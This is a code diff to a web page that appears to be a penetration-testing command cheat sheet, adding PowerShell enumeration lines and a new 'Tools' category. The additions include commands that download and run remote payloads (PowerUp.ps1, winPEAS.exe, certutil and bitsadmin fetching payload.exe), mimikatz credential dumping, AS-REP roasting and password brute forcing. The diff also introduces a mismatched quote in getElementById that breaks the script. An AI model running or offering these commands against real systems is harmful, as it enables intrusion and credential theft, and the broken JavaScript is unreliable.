@@ -71,6 +71,10 @@
         💻 PowerShell
         <span class="count" id="count-ps">0</span>
       </button>
+      <button class="category-btn" onclick="showCategory('Tools')">
+        🛠️ Tools
+        <span class="count" id="count-tools">0</span>
+      </button>
     </div>
 
     <div class="container">
@@ -330,8 +334,62 @@
           "Get-ADGroupMember -Identity 'Domain Admins' -Server {{DC}}",
           "Invoke-Expression (Invoke-WebRequest -Uri {{URL}}).Content",
           "Get-NetTCPConnection -LocalPort {{PORT}}",
-          "Resolve-DnsName {{DOMAIN}}"
+          "Resolve-DnsName {{DOMAIN}}",
+          "whoami /all",
+          "systeminfo",
+          "net users",
+          "net localgroup administrators",
+          "Get-PSDrive",
+          "Get-ChildItem -Path HKLM:\\Software -Recurse -ErrorAction SilentlyContinue",
+          "Get-Acl -Path 'HKLM:\\System\\CurrentControlSet\\Services' | fl",
+          "Get-Process | Select-Object Name, Id, Path",
+          "Get-Service | Where-Object {$_.Status -eq 'Running'}",
+          "Get-HotFix",
+          "Get-EventLog -LogName Security -Newest 10",
+          "Get-ComputerInfo",
+          "Get-LocalUser",
+          "Get-NetAdapter",
+          "Invoke-WebRequest -Uri 'http://{{IP}}:{{PORT}}/PowerUp.ps1' -OutFile PowerUp.ps1; . .\\PowerUp.ps1; Invoke-AllChecks",
+          "Invoke-WebRequest -Uri 'http://{{IP}}:{{PORT}}/winPEAS.exe' -OutFile winPEAS.exe; .\\winPEAS.exe",
+          "Get-ModifiableService",
+          "Get-ModifiablePath",
+          "Find-ProcessWithDLLInjection",
+          "Get-UnquotedService",
+          "Get-ServiceFilePermission",
+          "Get-ServicePermission"
         ],
+        "Tools": [
+          "msfconsole",
+          "burpsuite",
+          "wireshark",
+          "john --wordlist=rockyou.txt hash.txt",
+          "hashcat -m 0 -a 0 hash.txt rockyou.txt",
+          "hydra -l {{USER}} -P rockyou.txt {{IP}} ssh",
+          "airmon-ng start wlan0",
+          "sqlmap -u {{URL}} --dbs",
+          "nikto -h {{URL}}",
+          "nmap -A {{IP}}",
+          "aircrack-ng -w wordlist.txt capture.cap",
+          "dirb {{URL}} /usr/share/wordlists/common.txt",
+          "theharvester -d {{DOMAIN}} -l 500 -b google",
+          "responder -I eth0 -rdw",
+          "empire",
+          "mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' exit",
+          "rubeus.exe klist",
+          "SharpHound.exe -c All",
+          "certutil.exe -urlcache -f http://{{IP}}/payload.exe payload.exe",
+          "bitsadmin /transfer job /download /priority high http://{{IP}}/payload.exe C:\\payload.exe",
+          "net view /domain:{{DOMAIN}}",
+          "nltest /domain_trusts",
+          "powershell.exe -ExecutionPolicy Bypass -File script.ps1",
+          "Inveigh.exe",
+          "Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt",
+          "Covenant.exe",
+          "BloodHound.exe",
+          "netsh wlan show profiles",
+          "tasklist /svc",
+          "sc query"
+        ]
       };
 
       const validationRules = {
@@ -506,7 +564,7 @@
       }
 
       function updateCategoryCounts() {
-        const search = document.getElementById("search").value.toLowerCase();
+        const search = document.getElementById("search').value.toLowerCase();
 
         const categoryCountMap = {
           "Active Directory": "count-ad",
@@ -515,6 +573,7 @@
           Exploitation: "count-exploit",
           "Cloud Security": "count-cloud",
           "PowerShell": "count-ps",
+          "Tools": "count-tools",
         };
 
         for (const category in commands) {
@@ -533,7 +592,7 @@
 
         let totalCount = 0;
         for (const category in commands) {
-          const filtered = commands[category].filter(
+          const filtered = commands[category] .filter(
             (cmd) =>
               cmd.toLowerCase().includes(search) ||
               category.toLowerCase().includes(search)
